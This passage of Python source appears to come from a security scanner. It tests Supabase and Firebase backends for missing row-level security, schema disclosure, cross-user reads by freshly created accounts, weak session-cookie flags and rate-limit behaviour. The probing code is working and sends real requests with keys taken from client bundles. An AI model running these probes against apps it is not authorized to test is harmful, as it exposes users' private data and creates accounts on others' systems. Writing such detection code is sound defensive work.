# MANAGED-BACKEND SCHEMA DISCLOSURE. We were already reading both shapes of this and reporting neither: the RLS
# probes enumerate tables from the PostgREST mount root to build their candidate list, and the anon-write oracle
# reads the SQLSTATE out of a rejected write to decide whether it passed RLS. The disclosure was a TOOL.
_SQLSTATE_ERROR = re.compile(r'"code"\s*:\s*"(2[23][0-9A-Z]{3}|42[0-9A-Z]{3})"')
_DB_COLUMN_LEAK = re.compile(r"Failing row contains|column \"[A-Za-z_][A-Za-z0-9_]*\" of relation|"
                             r"violates (?:not-null|foreign key|check) constraint", re.I)


def backend_schema_disclosed(ctx, probe) -> bool | None:
    """The app's managed backend discloses its schema to an anonymous caller: the PostgREST root serves an
    OpenAPI document listing every table, or a rejected write answers with a SQLSTATE and column names.
    N/A when no managed backend is embedded (nothing to disclose)."""
    blob = _client_bundle(ctx)
    base = _supabase_base(blob, ctx)
    if not base:
        ctx.evidence["na_reason"] = "no managed-backend (Supabase/PostgREST) config embedded in the client"
        return None
    keys = [m.group(0) for m in _JWT.finditer(blob)] + _SUPABASE_PUB.findall(blob)
    if not keys:
        ctx.evidence["na_reason"] = "no public backend key in the client to read the schema with"
        return None
    with httpx.Client(timeout=8.0, follow_redirects=True, verify=False) as ext:
        for key in keys[:3]:
            hdr = {"apikey": key}
            if key.startswith("eyJ"):
                hdr["Authorization"] = "Bearer " + key
            with contextlib.suppress(Exception):
                root = ext.get(base + "/rest/v1/", headers=hdr, timeout=6.0)
                tables = _postgrest_tables(root)
                if root.status_code == 200 and tables:
                    ctx.evidence.update(disclosed=True, via="openapi-root", host=base,
                                        tables=sorted(tables)[:12], table_count=len(tables),
                                        repro=_repro_from_resp(
                                            root, matched="PostgREST root listed %d tables to the anon key"
                                                          % len(tables)))
                    return True
            # A rejected write is the other half: SQLSTATE plus the failing row's columns. Table names come from
            # the BUNDLE (the app's own .from('t') literals, plus observed reads and a common-name fallback),
            # the same source the RLS probes use — depending on the root here would make the error path
            # unreachable in exactly the case it exists for, a gateway whose root is correctly locked down.
            for table in _supabase_tables(blob, _observed_tables(ctx))[:6]:
                with contextlib.suppress(Exception):
                    r = ext.post(base + "/rest/v1/" + table, json={},
                                 headers={**hdr, "Content-Type": "application/json"}, timeout=6.0)
                    body = r.text or ""
                    if _SQLSTATE_ERROR.search(body) and _DB_COLUMN_LEAK.search(body):
                        ctx.evidence.update(disclosed=True, via="verbose-db-error", host=base, table=table,
                                            repro=_repro_from_resp(
                                                r, matched="database error disclosed SQLSTATE and column names"))
                        return True
    ctx.evidence.update(disclosed=False, host=base)
    return False


def _sensitive_leak(table: str, columns: list[str]) -> bool:
    """A table readable to anon is a LEAK only if it looks private: a sensitive table name OR a PII/secret
    column. A public-by-design table (blog posts, product catalog, countries) reading to anon is NOT a
    finding — this gate is what separates a real RLS misconfiguration from an intentionally-public table.

    DO NOT use this to gate an anonymous READ — use _sensitive_columns. The table-name half is the half that
    misfires there, and `profile` is one of the names it matches; see the note above _supabase_anon_writable.
    It stays as-is for the two DIFFERENTIAL callers (Firestore, and the authed tier), where a table name is
    corroboration rather than the whole case: sec-backend-002 fires only where ANON is denied and a fresh
    authed user still sees rows, so a public-by-design table is already excluded before this gate runs."""
    return bool(_SENSITIVE_TABLE.search(table) or any(_SENSITIVE_COLUMN.search(c) for c in columns))


def _sensitive_columns(columns: list[str]) -> list[str]:
    """The PII/secret column names in `columns`, COLUMNS ONLY. This is the same gate sec-exposure-008 applies
    and it is deliberately narrower than _sensitive_leak: a table NAMED `profiles` is not evidence that its
    contents are private, and the anon-read path has nothing but the name and the columns to go on.

    KNOWN TRADE-OFF, recorded rather than hidden: a genuinely sensitive table whose column names happen to be
    bland (`payments(id, amount, status)`) now reads clean here. The table-name half used to catch that case,
    at the cost of reporting every public profile directory in the corpus. Column names are the only evidence
    that survives contact with a hardened app, so the recall loss is the price and it belongs in the gap
    backlog, not in a silent 40-point penalty."""
    return [c for c in columns if _SENSITIVE_COLUMN.search(c)]


# ANON WRITE beats anon read as an RLS oracle, and it needs no write to succeed. An RLS-off table is often
# readable BY DESIGN (a build log's projects, a blog's posts), which is why the read path needs a sensitivity
# gate and why that gate misfires: measured on supavulnbase, the read probe reported `profiles` — the fixture's
# own control for "correct owner-scoped RLS" — while the three genuinely unpoliced tables went unnamed.
#
# Writability has no such ambiguity: no legitimate app lets an anonymous stranger INSERT. And PostgREST tells us
# without creating anything. POST an EMPTY object and read the SQLSTATE:
#   42501 / 401 / 403  -> RLS refused the write            -> SECURE, and this is what the controls answer
#   23502 / 23503 ...  -> a CONSTRAINT rejected it, meaning the insert already passed RLS -> FINDING
#   PGRST204 / 42P01   -> schema mismatch or absent table  -> inconclusive, never a finding
# Measured on the fixture: projects / updates / drafts answer 23502 (all three are declared findings) while
# profiles / payout_accounts / sponsor_leads answer 42501 (two are declared controls). Row counts unchanged.
# SQLSTATE is five ALPHANUMERIC characters, not five digits: `22P02` (invalid text representation) is a real
# and common one, and a \d{3} tail silently dropped every lettered code in the class.
_RLS_PASSED_SQLSTATE = re.compile(r"^(?:22|23)[0-9A-Z]{3}$")    # integrity / data-exception = past RLS
_RLS_REFUSED_SQLSTATE = {"42501"}


def _supabase_anon_writable(client, base: str, keys: list[str], tables: list[str]):
    """{table, sqlstate, repro} for the first table an anonymous INSERT gets PAST RLS on, else None.
    Never creates a row: the body is empty, so a table that accepts the write still fails validation."""
    for key in keys[:3]:
        hdr = {"apikey": key, "Content-Type": "application/json"}
        if key.startswith("eyJ"):
            hdr["Authorization"] = "Bearer " + key
        cand = _supabase_candidate_tables(client, base, hdr, tables)
        for table in cand[:20]:
            try:
                r = client.post(base + "/rest/v1/" + table, json={}, headers=hdr, timeout=6.0)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if r.status_code in (401, 403):
                continue                       # RLS refused -> secure
            code = ""
            with contextlib.suppress(Exception):
                code = str((r.json() or {}).get("code") or "")
            if code in _RLS_REFUSED_SQLSTATE:
                continue
            if _RLS_PASSED_SQLSTATE.match(code):
                return {"table": table, "sqlstate": code,
                        "repro": _repro_from_resp(
                            r, matched="anonymous INSERT passed RLS (rejected only by constraint %s)" % code)}
    return None


def _supabase_readable(client, base: str, keys: list[str], tables: list[str]):
    """Return {table, rows, columns} for the first SENSITIVE table that returns rows to the anon/publishable
    key (RLS off or permissive + anon grant), 'unreachable' if the host can't be reached (-> N/A), else None.
    The PostgREST response taxonomy is the detector: non-empty 200 array = rows exposed (candidate); []+200 =
    RLS default-deny (SECURE); 401/403 (42501) = no grant; 404 (42P01) = table absent — none of which fire.
    A publishable key (sb_publishable_, not a JWT) goes in `apikey` only; a JWT anon key also selects the
    role via `Authorization: Bearer`. Reads ONE row (for column-name sensitivity), never writes."""
    reached = False
    for key in keys[:3]:
        hdr = {"apikey": key}
        if key.startswith("eyJ"):
            hdr["Authorization"] = "Bearer " + key   # JWT = PostgREST role selector; publishable keys aren't
        cand = _supabase_candidate_tables(client, base, hdr, tables)
        if len(cand) > len(tables):
            reached = True     # the root answered, so the host is up even if no table reads
        for table in cand[:20]:
            try:
                r = client.get(base + "/rest/v1/" + table, params={"select": "*", "limit": "1"},
                               headers=hdr, timeout=6.0)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            reached = True
            if r.status_code != 200:
                continue                              # 401/403 no grant, 404 absent -> not a leak
            try:
                rows = r.json()
            except ValueError:
                continue
            if isinstance(rows, list) and rows:       # non-empty -> RLS off/permissive
                columns = sorted(rows[0]) if isinstance(rows[0], dict) else []
                # COLUMNS ONLY, and the table name deliberately does not count. Measured on supavulnbase's
                # HARDENED reference (HARDEN_CLASS=all): the write half above was fixed, control fell through
                # to here, and `profiles` (bio/created_at/display_name/id/username/website) was reported for
                # 40 points — ctl-002, the fixture's own control for CORRECT owner-scoped RLS. The table-name
                # half of _sensitive_leak matched on `profile` alone. Write-first ordering masked this rather
                # than suppressing it, so it stayed invisible until a hardened target existed.
                sensitive = _sensitive_columns(columns)
                if sensitive:
                    return {"table": table, "rows": len(rows), "columns": columns[:8],
                            "sensitive_columns": sensitive[:6],
                            "repro": _repro_from_resp(
                                r, matched="%d row(s) readable to anon, carrying %s"
                                           % (len(rows), ", ".join(sensitive[:3])))}
    return None if reached else "unreachable"


def _firebase_readable(client, json_url: str):
    """The whole Realtime Database if it's world-readable: GET <db>/.json returns data (not null / not a
    permission error). 'unreachable' on a network error (-> N/A)."""
    try:
        r = client.get(json_url, timeout=6.0)
    except (httpx.HTTPError, httpx.InvalidURL):
        return "unreachable"
    if r.status_code == 200:
        try:
            data = r.json()
        except ValueError:
            return None
        if data not in (None, {}, []):
            return data
    return None


def _rtdb_sensitive_names(data) -> list[str]:
    """Sensitive node/field names in a world-readable RTDB tree. RTDB `.read:true` exposes the WHOLE tree
    with no per-path rules, so the leak is a top-level node named like a private table (users/payments/...)
    OR a nested field named like PII/secret (email/token/...); a public-by-design tree (config, or a
    leaderboard of name+score) is not. Scans every top-level node and ONE sampled leaf per node -- RTDB
    nodes are homogeneous, so a sample suffices -- and is bounded by a node budget regardless of row count.
    This brings the RTDB path to parity with the Supabase read path's column-sensitivity gate."""
    names: list[str] = []
    budget = [400]

    def _walk(node, level):
        if budget[0] <= 0 or level > 2 or not isinstance(node, dict):
            return
        for i, (k, v) in enumerate(node.items()):
            if budget[0] <= 0:
                return
            budget[0] -= 1
            if isinstance(k, str) and (_SENSITIVE_COLUMN.search(k) or (level == 0 and _SENSITIVE_TABLE.search(k))):
                names.append(k)
            if level == 0 or i == 0:      # all top-level nodes; then one homogeneous sample per node
                _walk(v, level + 1)

    _walk(data, 0)
    return names


def _firestore_collections(blob: str, observed: list[str] | None = None) -> list[str]:
    """Collections to test for public readability, strongest signal first: OBSERVED at runtime (survives
    minification/dynamic queries), then the app's own code (`collection(db, 'name')`), then a small
    common-name fallback."""
    found = list(dict.fromkeys(list(observed or [])
                               + [m.group(1) for m in _FIRESTORE_COLL.finditer(blob)]))
    return (found + [c for c in _COMMON_COLLECTIONS if c not in found])[:14]


def _firestore_readable(client, base: str, project: str, api_key: str, collections: list[str]):
    """A Firestore collection world-readable to the PUBLIC web API key: GET the REST documents endpoint;
    a 200 with a non-empty `documents` array = rules allow public read (allow read: if true). 'unreachable'
    on a network error (-> N/A); None if reached but every collection is protected (403) or empty."""
    reached = False
    for coll in collections:
        url = "%s/v1/projects/%s/databases/(default)/documents/%s" % (base, project, coll)
        try:
            r = client.get(url, params={"key": api_key, "pageSize": "1"}, timeout=6.0)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        reached = True
        if r.status_code == 200:
            try:
                docs = r.json().get("documents")
            except (ValueError, AttributeError):
                continue
            if isinstance(docs, list) and docs:   # real documents to the public key -> world-readable rules
                fields = sorted((docs[0].get("fields") or {}).keys())
                sensitive = _sensitive_columns(fields)
                if not sensitive:
                    continue                       # public-by-design collection (no PII/secret field): NOT a leak,
                                                   # the same column-sensitivity gate the Supabase read path applies
                return {"collection": coll, "documents": len(docs), "fields": fields[:8],
                        "sensitive_fields": sensitive[:6],
                        "repro": _repro_from_resp(
                            r, matched="%d document(s) readable to anon, carrying %s"
                                       % (len(docs), ", ".join(sensitive[:3])))}
    return None if reached else "unreachable"


def exposed_backend_readable(ctx, probe) -> bool | None:
    """Managed backend (Supabase/Firebase) shipped without row-level security: mine the client bundle for
    the config + public key, then read the DB with that key. Fire if real rows come back. N/A when no such
    config is embedded (the firewalled Tier-A case) or the provider host is unreachable (egress blocked)."""
    blob = _client_bundle(ctx)
    sm = _supabase_base(blob, ctx)          # hosted project OR a co-located self-hosted PostgREST gateway
    fm = _FIREBASE_RTDB.search(blob)
    proj_m = _FIREBASE_PROJECT.search(blob)
    key_m = _FIREBASE_APIKEY.search(blob)
    fs_used = bool(_FIRESTORE_SIGNAL.search(blob) and proj_m and key_m)   # Firestore SDK + public web config
    if not sm and not fm and not fs_used:
        return None  # no managed-backend config in the client -> nothing to test
    reached = False
    keys = [m.group(0) for m in _JWT.finditer(blob)] + _SUPABASE_PUB.findall(blob)   # JWT anon + publishable
    with httpx.Client(timeout=8.0, follow_redirects=True, verify=False) as ext:   # external provider hosts
        if sm:
            base = sm
            tables = _supabase_tables(blob, _observed_tables(ctx))
            # WRITE first: it is the unambiguous half, so an app whose tables are public-by-design but
            # correctly write-protected reports nothing instead of reporting its own control table.
            w = _supabase_anon_writable(ext, base, keys, tables)
            if isinstance(w, dict):
                ctx.evidence.update(backend="supabase", host=base, table=w["table"], anon_writable=True,
                                    write_confirmed=True, sqlstate=w["sqlstate"], repro=w["repro"])
                return True
            hit = _supabase_readable(ext, base, keys, tables)
            if isinstance(hit, dict):
                ctx.evidence.update(backend="supabase", host=base, table=hit["table"],
                                    rows_readable=hit["rows"], columns=hit["columns"],
                                    bulk_read=True, sensitive_columns=hit.get("sensitive_columns"), repro=hit["repro"])
                return True
            reached = reached or hit != "unreachable"
        if fm:
            url = "https://" + fm.group(1) + "/.json"
            data = _firebase_readable(ext, url)
            if isinstance(data, (dict, list)) and data:
                sensitive = _rtdb_sensitive_names(data)
                if sensitive:                       # gate on sensitive node/field names (Supabase-path parity)
                    ctx.evidence.update(backend="firebase-rtdb", bulk_read=True, host=fm.group(1),
                                        sample_keys=sorted(data)[:8] if isinstance(data, dict) else len(data),
                                        sensitive_fields=sensitive[:6],
                                        repro=_repro("GET", url, status=200,
                                                     matched="RTDB readable to anon, carrying %s"
                                                             % ", ".join(sensitive[:3])))
                    return True
            reached = reached or data != "unreachable"
        if fs_used:
            proj, key = proj_m.group(1), key_m.group(0)
            hit = _firestore_readable(ext, "https://firestore.googleapis.com", proj, key,
                                      _firestore_collections(blob, _observed_tables(ctx)))
            if isinstance(hit, dict):
                ctx.evidence.update(backend="firestore", bulk_read=True, project=proj, collection=hit["collection"],
                                    documents_readable=hit["documents"], fields=hit["fields"],
                                    sensitive_fields=hit.get("sensitive_fields"), repro=hit["repro"])
                return True
            reached = reached or hit != "unreachable"
    ctx.evidence.update(checked=True, reachable=reached, world_readable=False)
    return False if reached else None   # reached-but-protected = clean; unreachable = N/A (egress blocked)


# --- authenticated-tier BaaS access control (sec-backend-002) ----------------------------------------
# The IDOR equivalent on an off-origin BaaS SPA — OWASP A01 (Broken Access Control, the #1 risk): RLS/Rules
# are PRESENT but over-permissive, so ANY logged-in user reads EVERYTHING (Supabase `using
# (auth.role()='authenticated')`, Firebase `allow read: if request.auth != null`) — the most common
# critical access-control finding (CVE-2025-48757 / the Lovable class). Classic register-2-accounts IDOR is
# dead here (no app backend), so we drive the BaaS auth directly: obtain ONE throwaway identity, then read
# as it. DIFFERENTIAL: fire only where ANON is denied but a FRESH authed user (who created nothing) sees
# SENSITIVE rows — anon-open is sec-backend-001's job, and a correct per-user policy returns [] to a fresh
# user. Read-only on app DATA; Firebase uses ANONYMOUS auth (no persistent account), Supabase a throwaway
# signup (one obvious-test-email auth.users row) — N/A when auth can't be obtained (closed signup / email
# confirmation / anonymous-auth-off). One throwaway identity is the only side effect; never a data write.


def _firebase_anon_token(client, base: str, api_key: str):
    """A throwaway Firebase ANONYMOUS-auth idToken (no persistent account, no PII) — or None if anonymous
    sign-in is disabled on the project. Zero side effect: an anonymous session isn't a real user record."""
    try:
        r = client.post(base + "/v1/accounts:signUp", params={"key": api_key},
                        json={"returnSecureToken": True}, timeout=6.0)
        return r.json().get("idToken") if r.status_code == 200 else None
    except (httpx.HTTPError, httpx.InvalidURL, ValueError):
        return None


def _firestore_docs(resp):
    try:
        d = resp.json().get("documents") if resp.status_code == 200 else None
    except (ValueError, AttributeError):
        return []
    return d if isinstance(d, list) else []


def _firestore_authed_only(client, base, project, api_key, id_token, collections):
    """A collection a FRESH authenticated user reads but ANON cannot -> `allow read: if request.auth != null`
    (any logged-in user reads everything). Returns {collection,...} for the first sensitive such collection,
    'unreachable', or None. Read-only."""
    reached = False
    for coll in collections:
        url = "%s/v1/projects/%s/databases/(default)/documents/%s" % (base, project, coll)
        try:
            anon = client.get(url, params={"key": api_key, "pageSize": "1"}, timeout=6.0)
            authed = client.get(url, params={"key": api_key, "pageSize": "3"},
                                headers={"Authorization": "Bearer " + id_token}, timeout=6.0)
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        reached = True
        docs = _firestore_docs(authed)
        if not _firestore_docs(anon) and docs:   # anon denied, a fresh authed user sees documents
            fields = sorted((docs[0].get("fields") or {}).keys())[:8]
            if _sensitive_leak(coll, fields):
                return {"collection": coll, "documents": len(docs), "fields": fields,
                        "repro": _repro_from_resp(authed, matched="%d doc(s) readable by ANY authed user" % len(docs))}
    return None if reached else "unreachable"


def _supabase_signup(client, base: str, anon_key: str):
    """A throwaway Supabase Auth access-token (JWT) — or None when signup is closed OR requires email
    confirmation (no immediate session). Creates ONE obvious test account (auth.users); never writes app
    data. Signup is public-by-design, so this is a low, identifiable side effect."""
    body = {"email": "hlrlstest+%s@example.com" % secrets.token_hex(4),
            "password": "hlRls-" + secrets.token_hex(8)}
    try:
        r = client.post(base + "/auth/v1/signup", headers={"apikey": anon_key}, json=body, timeout=6.0)
        return r.json().get("access_token") if r.status_code in (200, 201) else None
    except (httpx.HTTPError, httpx.InvalidURL, ValueError):
        return None


def _supabase_candidate_tables(client, base: str, hdr: dict, tables) -> list:
    """The tables to test: the ones mined from the bundle (plus observed reads and the common-name fallback),
    ENRICHED with whatever the PostgREST mount root discloses.

    One helper because this was the same bug three times. `sponsor_leads` never appears in a bundle literal the
    anonymous blob can see — its `.from()` call lives in an authed route's chunk — so the candidate list fell
    back to sixteen generic names and the table was never tested. The root discloses all six names to the anon
    key (that is sec-backend-003's finding), and two of the three read paths had grown their own inline copy of
    this enrichment while the authed-tier path had none.

    ORDER MATTERS as much as membership. The root's list is the SERVER'S OWN schema, so it outranks every name
    we guessed; appending it after the sixteen common-name fallbacks left `sponsor_leads` at index 16+ and every
    caller slices the list (`tables[:16]`, `cand[:20]`), so the real table was enriched in and then cut off
    again. Ground truth first, guesses last."""
    disclosed = []
    with contextlib.suppress(Exception):
        disclosed = list(_postgrest_tables(client.get(base + "/rest/v1/", headers=hdr, timeout=6.0)))
    return disclosed + [t for t in tables if t not in disclosed]


def _foreign_rows(rows: list, own_ids: set) -> list:
    """The subset of `rows` NOT owned by the FRESH test user -- a genuine CROSS-USER read. A row is the fresh
    user's OWN when an owner column (owner_id/user_id/created_by/... via _OWNER_ID_FIELD, or `id`/`uid`) holds
    their JWT `sub`, or an email column holds their signup email. A CORRECTLY per-user-scoped table (RLS
    `using(auth.uid() = user_id)`, plus the near-universal Supabase handle_new_user() trigger that seeds the
    fresh user's OWN profile row) therefore returns ONLY own rows here -> [] -> NO leak; only a row belonging to
    SOMEONE ELSE proves the 'any authenticated user reads everything' bypass. Fail-closed: with no identifiable
    own-id we cannot prove any row is cross-user -> [] (don't fire). A real Supabase access_token always carries
    sub+email, so this only guards a malformed token."""
    if not own_ids:
        return []
    def _owns(k: str) -> bool:
        return bool(_OWNER_ID_FIELD.match(k)) or k.lower() in ("id", "uid") or "email" in k.lower()
    return [r for r in rows if isinstance(r, dict)
            and not any(str(v) in own_ids for k, v in r.items() if isinstance(v, (str, int)) and _owns(k))]


def _supabase_authed_only(client, base, anon_key, user_jwt, tables):
    """A table where a FRESH authenticated user reads rows OWNED BY SOMEONE ELSE while ANON cannot -> a broken
    `authenticated`-tier RLS policy (any logged-in user reads all rows, the IDOR equivalent on a BaaS SPA). The
    fresh user's OWN rows (the handle_new_user() profile row, anything keyed on its sub/email) are EXCLUDED, so a
    correctly per-user-scoped table -- which returns only the fresh user's own row -- does NOT fire. Differential
    + own-row filter + sensitivity gated; read-only. {table,...} / 'unreachable' / None."""
    claims = auth._jwt_claims(user_jwt) or {}
    own_ids = {str(claims[k]) for k in ("sub", "email") if claims.get(k)}
    tables = _supabase_candidate_tables(client, base, {"apikey": anon_key,
                                                       "Authorization": "Bearer " + anon_key}, tables)
    def read(table, jwt, lim):
        r = client.get(base + "/rest/v1/" + table, params={"select": "*", "limit": lim},
                       headers={"apikey": anon_key, "Authorization": "Bearer " + jwt}, timeout=6.0)
        try:
            j = r.json() if r.status_code == 200 else None
        except ValueError:
            j = None
        return (j if isinstance(j, list) else None), r
    reached = False
    for table in tables[:16]:
        try:
            anon_rows, _ = read(table, anon_key, "1")
            authed_rows, authed_resp = read(table, user_jwt, "3")
        except (httpx.HTTPError, httpx.InvalidURL):
            continue
        reached = True
        if not anon_rows and authed_rows:   # anon denied/empty, a fresh authed user sees rows
            foreign = _foreign_rows(authed_rows, own_ids)   # drop the fresh user's OWN rows -> only cross-user left
            if foreign:
                columns = sorted(foreign[0]) if isinstance(foreign[0], dict) else []
                if _sensitive_leak(table, columns):
                    return {"table": table, "rows": len(foreign), "columns": columns[:8],
                            "repro": _repro_from_resp(authed_resp,
                                     matched="%d cross-user row(s) readable by ANY authed user (own rows excluded)" % len(foreign))}
    return None if reached else "unreachable"


def authenticated_backend_readable(ctx, probe) -> bool | None:
    """Authenticated-tier RLS/Rules bypass — the IDOR equivalent on a BaaS SPA (OWASP A01). A FRESH
    authenticated identity reads rows/documents it didn't create: the 'any logged-in user reads everything'
    misconfiguration. Differential vs anon (anon-open is sec-backend-001's) + sensitivity gated + read-only
    on app data. N/A when no Supabase/Firestore config, no throwaway auth is obtainable (closed signup /
    confirmation / anonymous-auth-off), or the host is unreachable."""
    blob = _client_bundle(ctx)
    sm = _supabase_base(blob, ctx)          # hosted project OR a co-located self-hosted PostgREST gateway
    proj_m = _FIREBASE_PROJECT.search(blob)
    key_m = _FIREBASE_APIKEY.search(blob)
    fs_used = bool(_FIRESTORE_SIGNAL.search(blob) and proj_m and key_m)
    if not sm and not fs_used:
        return None   # no probeable per-user BaaS data plane embedded
    reached = False
    with httpx.Client(timeout=8.0, follow_redirects=True, verify=False) as ext:
        if fs_used:
            token = _firebase_anon_token(ext, "https://identitytoolkit.googleapis.com", key_m.group(0))
            if token:
                hit = _firestore_authed_only(ext, "https://firestore.googleapis.com", proj_m.group(1),
                                             key_m.group(0), token,
                                             _firestore_collections(blob, _observed_tables(ctx)))
                if isinstance(hit, dict):
                    ctx.evidence.update(backend="firestore", tier="authenticated", cross_user_read=True, bulk_read=True, project=proj_m.group(1),
                                        collection=hit["collection"], documents_readable=hit["documents"],
                                        fields=hit["fields"], repro=hit["repro"])
                    return True
                reached = reached or hit != "unreachable"
        if sm:
            base = sm
            anon_key = next((m.group(0) for m in _JWT.finditer(blob)), None) or \
                next(iter(_SUPABASE_PUB.findall(blob)), None)
            if anon_key:
                jwt = _supabase_signup(ext, base, anon_key)
                if jwt:
                    hit = _supabase_authed_only(ext, base, anon_key, jwt,
                                                _supabase_tables(blob, _observed_tables(ctx)))
                    if isinstance(hit, dict):
                        ctx.evidence.update(backend="supabase", tier="authenticated", cross_user_read=True, bulk_read=True, host=base,
                                            table=hit["table"], rows_readable=hit["rows"],
                                            columns=hit["columns"], repro=hit["repro"])
                        return True
                    reached = reached or hit != "unreachable"
    ctx.evidence.update(checked=True, reachable=reached, authenticated_bypass=False)
    return False if reached else None


def _https_browser_enforced(ctx) -> bool:
    """HTTPS is ALREADY enforced by the browser for this host, so a cookie missing `Secure` cannot transit in
    cleartext — the request is upgraded before it leaves. True for a preloaded-apex platform subdomain, or
    when the app itself sends HSTS with includeSubDomains AND preload (i.e. it claims preload-list
    membership; a bare max-age is trust-on-first-use, so we do NOT suppress on that). Mirrors the
    sec-headers-003 carve-out: without it we forgive a missing HSTS header on *.vercel.app yet still charge
    for the Secure flag that same enforcement makes redundant. Suppression is upside-only."""
    host = urllib.parse.urlparse(getattr(ctx, "base_url", "") or "").netloc.lower().split(":")[0]
    if host.endswith(_HSTS_PRELOADED_SUFFIXES):
        return True
    with contextlib.suppress(Exception):
        hsts = ctx.client.get("/").headers.get("strict-transport-security", "").lower().replace(" ", "")
        m = re.search(r"max-age=(\d+)", hsts)
        if m and int(m.group(1)) > 0 and "includesubdomains" in hsts and "preload" in hsts:
            return True
    return False


def _browser_lane_detail() -> str:
    """What the BROWSER registration lane hit, appended to an N/A reason. Empty when the lane never ran (no
    --browser-auth, or no auth surface to spend a launch on), so the reason stays honest about that too."""
    stage = (auth.LAST_BROWSER_DIAG or {}).get("stage")
    return " | browser lane: " + stage if stage else " | browser lane: not attempted"


def session_cookie_missing_flag(ctx, probe) -> bool | None:
    """Self-as-oracle: register an account, then inspect the session cookie it sets. Slop if it lacks
    the hardening flag named in the probe (httponly | samesite | secure). Returns None (-> N/A) when
    self-registration couldn't establish a session (CSRF/JSON-API app) — a false 'clean' would be a
    missed finding, not a pass."""
    flag = probe.probe.get("flag", "httponly")
    account = ctx.register()
    if account is None:
        # WHY, not just N/A. Measured on v10 (865 apps, run WITH --browser-auth): the session cluster reported
        # N/A on 177 of the 204 apps that have BOTH a login and a signup, and every one of those records
        # carried no na_reason — so the corpus could not distinguish "registration failed" from "this app's
        # auth simply isn't in a cookie". Those have opposite fixes (auth lanes vs. sec-session-005 already
        # covering it correctly), and one run of telemetry decides which.
        ctx.evidence["na_reason"] = ("self-registration could not establish an account (no signup lane "
                                     "succeeded: refused, e-mail confirmation required, CAPTCHA, or SSO-only)"
                                     + _browser_lane_detail())
        return None
    try:
        cookie = auth.session_cookie(account.register_response)
        if cookie is None:
            # TWO different worlds here, and the earlier version of this reason conflated them into a claim of
            # coverage that did not exist. Measured on v11 (1,531 apps): 187 apps reported "token auth is
            # sec-session-005's case" and sec-session-005 ran on ZERO of them — because it needs
            # _has_session(), which is false when there is neither a bearer nor a cookie anywhere.
            #
            #   bearer present  -> genuinely token auth. sec-session-005 DOES pick this up. Correct N/A.
            #   nothing at all  -> we hold no session by any means, so "registered" is an illusion: a 2xx from
            #                      an SPA placeholder POST that never reached a backend. _has_session's own
            #                      docstring names this case. It is a coverage HOLE, not coverage.
            if auth._has_session(account):
                ctx.evidence["na_reason"] = ("registered with a bearer token and no session cookie — token auth "
                                             "(JWT in localStorage / Authorization header), which is "
                                             "sec-session-005's case" + _browser_lane_detail())
            else:
                ctx.evidence["na_reason"] = ("registration returned a response but established NO session — no "
                                             "cookie and no bearer, so the signup POST likely hit an SPA shell "
                                             "without reaching a backend; nothing to test and NOT covered "
                                             "elsewhere" + _browser_lane_detail())
            return None
        # record WHICH cookie was judged: several can match the session-name heuristic, so an unnamed
        # verdict is unfalsifiable ("no HttpOnly" on an app whose real token HAS it reads as a bug).
        ctx.evidence.update(flag=flag, present=cookie[flag], cookie=cookie["name"])
        if flag == "secure" and not cookie["secure"] and _https_browser_enforced(ctx):
            ctx.evidence["suppressed"] = ("HTTPS is browser-enforced for this host (HSTS preload / "
                                          "preloaded-apex subdomain) -> the cookie cannot transit cleartext")
            return False
        return not cookie[flag]
    finally:
        account.client.close()


def session_token_in_local_storage(ctx, probe) -> bool | None:
    """Self-as-oracle: register, then report whether the app PERSISTED its session token in localStorage. A JWT in
    localStorage is readable by any XSS on the origin (unlike an HttpOnly cookie) — the token-auth analog of a
    session cookie missing HttpOnly, and the bolt/Supabase/Firebase cohort's default session model. Slop when a
    persisted token was found; clean when a session was established WITHOUT one (a cookie, or an in-memory bearer);
    N/A when no session could be established — reading localStorage needs the browser register (httpx alone can't),
    so this is inherently N/A without --browser-auth, never a false 'clean'."""
    account = ctx.register()
    if account is None:
        ctx.evidence["na_reason"] = ("self-registration could not establish an account (no signup lane "
                                     "succeeded: refused, e-mail confirmation required, CAPTCHA, or SSO-only)"
                                     + _browser_lane_detail())
        return None
    try:
        if account.provided:
            ctx.evidence["na_reason"] = ("session supplied via --header: reveals nothing about how the app "
                                         "STORES its own token")
            return None
        if not auth._has_session(account):
            ctx.evidence["na_reason"] = ("account created but no session established (e-mail verification / "
                                         "CAPTCHA / SSO), or the run had no browser to read localStorage with"
                                         + _browser_lane_detail())
            return None
        exposed = bool(account.storage_exposed)
        ctx.evidence.update(session_in_local_storage=exposed)
        return exposed  # True = token sits in localStorage (XSS-exfiltratable); False = session held elsewhere
    finally:
        account.client.close()


# A genuine login backend REJECTS wrong creds with an auth-shaped answer. A client-side-auth SPA (Supabase/
# Firebase from the browser) or a platform-hosted static page just echoes a 200 shell — or 405/404 — for the
# POST: there's no server auth of the app's to rate-limit, so a "no rate limiting" finding there is a phantom
# (the biggest sec-ratelimit-001 FP class, mostly UNDER precision.py's catch-all radar since these hosts 404
# real paths). find_json_login already applies this test on the JSON path; this brings the HTML path to parity.
_AUTH_REJECT = re.compile(
    r"invalid|incorrect|wrong\s*(?:password|credential|email|username)|bad\s+credential|"
    r"authentication\s+failed|login\s+failed|unauthor|not\s+authorized", re.IGNORECASE)


def _looks_like_auth_reject(resp) -> bool:
    """True when `resp` is a real login backend saying 'no' to wrong creds — an auth-failure status, a
    redirect to a login/error page, a JSON answer, or an auth-failure phrase — NOT a bare 200 shell / 405 /
    404. Gates the rate-limit finding onto endpoints that ACTUALLY process credentials."""
    try:
        sc = resp.status_code
    except Exception:
        return False
    if sc in (400, 401, 403, 422):
        return True
    if sc in (301, 302, 303, 307, 308):
        loc = resp.headers.get("location", "")
        if not loc:
            return False
        # A redirect that only upgrades the scheme (http->https) or canonicalizes the host (www/apex) while
        # keeping the SAME path is a transport redirect, not a credential rejection: every wrong-password
        # attempt gets the identical 3xx, so counting it would phantom-fire "never throttled" on an endpoint
        # that never processed the login. (A same-origin redirect back to /login IS still counted -- that is
        # the flash-error re-render pattern, a real rejection.)
        try:
            req = resp.request.url
            tgt = req.join(loc)
            if (tgt.path.rstrip("/") == req.path.rstrip("/")
                    and (tgt.scheme != req.scheme or tgt.host != req.host)):
                return False
        except Exception:
            pass
        return any(h in loc.lower() for h in _CSRF_REJECT_HINTS)
    if "json" in resp.headers.get("content-type", "").lower():
        return True
    try:
